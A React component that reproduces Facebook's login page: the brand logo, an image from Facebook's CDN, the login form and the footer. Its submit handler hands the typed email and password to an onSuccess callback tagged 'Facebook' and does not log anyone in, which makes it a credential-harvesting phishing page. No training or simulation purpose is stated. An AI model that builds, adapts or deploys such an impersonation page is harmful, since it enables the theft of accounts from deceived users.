import React, { useState } from 'react';
import { Plus } from 'lucide-react';

interface FacebookLoginProps {
  onSuccess: (data: any) => void;
}

const FacebookLogin: React.FC<FacebookLoginProps> = ({ onSuccess }) => {
  const [email, setEmail] = useState('');
  const [password, setPassword] = useState('');

  const handleSubmit = (e: React.FormEvent) => {
    e.preventDefault();
    onSuccess({ platform: 'Facebook', email, password });
  };

  return (
    <div className="min-h-full w-full bg-[#f0f2f5] text-gray-900 flex flex-col justify-between select-none animate-view overflow-y-auto">
      <div className="flex-1 max-w-[1240px] mx-auto w-full grid grid-cols-1 lg:grid-cols-12 gap-8 items-center px-8 py-16">
        
        <div className="lg:col-span-7 flex flex-col space-y-6">
          <svg className="h-16 w-auto self-start text-[#1877f2] -ml-2" fill="currentColor" viewBox="0 0 24 24">
            <path d="M24 12.073c0-6.627-5.373-12-12-12s-12 5.373-12 12c0 5.99 4.388 10.954 10.125 11.854v-8.385H7.078v-3.47h3.047V9.43c0-3.007 1.792-4.669 4.533-4.669 1.312 0 2.686.235 2.686.235v2.953H15.83c-1.491 0-1.956.925-1.956 1.874v2.25h3.328l-.532 3.47h-2.796v8.385C19.612 23.027 24 18.062 24 12.073z"/>
          </svg>
          
          <img 
            src="https://static.xx.fbcdn.net/rsrc.php/yB/r/83zWJdc6PJI.webp" 
            className="w-full max-w-[480px] h-auto object-contain mt-2" 
            alt="Explore the things you love."
          />
        </div>

        <div className="lg:col-span-5 flex flex-col space-y-6">
          <form onSubmit={handleSubmit} className="bg-white shadow-[0_2px_4px_rgba(0,0,0,0.1),0_8px_16px_rgba(0,0,0,0.1)] rounded-lg p-6 w-full max-w-[400px] border border-neutral-200/40 flex flex-col space-y-4 smooth-transition mx-auto">
            
            <h2 className="text-base font-bold text-neutral-800 mb-1">Log in to Facebook</h2>
            
            <div className="flex flex-col space-y-3">
              <input 
                type="text" 
                placeholder="Email address or mobile number" 
                value={email}
                onChange={(e) => setEmail(e.target.value)}
                className="w-full border border-neutral-300 rounded-md py-3 px-4 outline-none focus:border-fbBlue focus:ring-1 focus:ring-fbBlue transition text-[15px] text-neutral-900 bg-white shadow-sm"
              />
              <input 
                type="password" 
                placeholder="Password" 
                value={password}
                onChange={(e) => setPassword(e.target.value)}
                className="w-full border border-neutral-300 rounded-md py-3 px-4 outline-none focus:border-fbBlue focus:ring-1 focus:ring-fbBlue transition text-[15px] text-neutral-900 bg-white shadow-sm"
              />
            </div>

            <button type="submit" className="w-full bg-[#1877f2] hover:bg-[#166fe5] text-white font-bold py-2.5 rounded-md text-base transition scale-on-click shadow-sm">
              Log in
            </button>

            <a href="#" className="text-fbBlue text-xs font-semibold text-center hover:underline transition py-1">Forgotten password?</a>
            
            <div className="border-t border-neutral-200/80 my-4"></div>

            <button type="button" className="border border-[#1877f2] text-[#1877f2] hover:bg-neutral-50/50 font-bold py-3 px-6 rounded-full text-xs transition scale-on-click self-center">
              Create new account
            </button>
          </form>
          
          <p className="text-xs text-neutral-500 text-center">
            <a href="#" className="font-bold text-neutral-600 hover:underline">Create a Page</a> for a celebrity, brand or business.
          </p>
        </div>
      </div>

      <div className="bg-white border-t border-neutral-200 px-8 py-8 text-[11px] text-neutral-500">
        <div className="max-w-[1000px] mx-auto flex flex-col space-y-3">
          <div className="flex flex-wrap gap-x-4 gap-y-1 border-b border-neutral-200 pb-2">
            <span className="text-neutral-800">English (UK)</span>
            <a href="#" className="hover:underline">اردو</a>
            <a href="#" className="hover:underline">پښتو</a>
            <a href="#" className="hover:underline">العربية</a>
            <a href="#" className="hover:underline">हिन्दी</a>
            <a href="#" className="hover:underline">বাংলা</a>
            <a href="#" className="hover:underline">ਪੰਜਾਬੀ</a>
            <button type="button" className="bg-neutral-100 hover:bg-neutral-200 px-2 py-0.5 rounded border border-neutral-300 text-[9px]"><Plus size={8} /></button>
          </div>
          <div className="flex flex-wrap gap-x-4 gap-y-1">
            <a href="#" className="hover:underline">Sign Up</a>
            <a href="#" className="hover:underline">Log in</a>
            <a href="#" className="hover:underline">Messenger</a>
            <a href="#" className="hover:underline">Facebook Lite</a>
            <a href="#" className="hover:underline">Video</a>
            <a href="#" className="hover:underline">Meta Pay</a>
            <a href="#" className="hover:underline">Meta Store</a>
            <a href="#" className="hover:underline">Meta Quest</a>
            <a href="#" className="hover:underline">Instagram</a>
            <a href="#" className="hover:underline">Threads</a>
            <a href="#" className="hover:underline">Privacy Policy</a>
            <a href="#" className="hover:underline">AdChoices</a>
            <a href="#" className="hover:underline">Terms</a>
          </div>
          <div className="flex items-center space-x-1.5 pt-1">
            <span className="font-bold text-neutral-600">Meta © 2026</span>
          </div>
        </div>
      </div>
    </div>
  );
};

export default FacebookLogin;
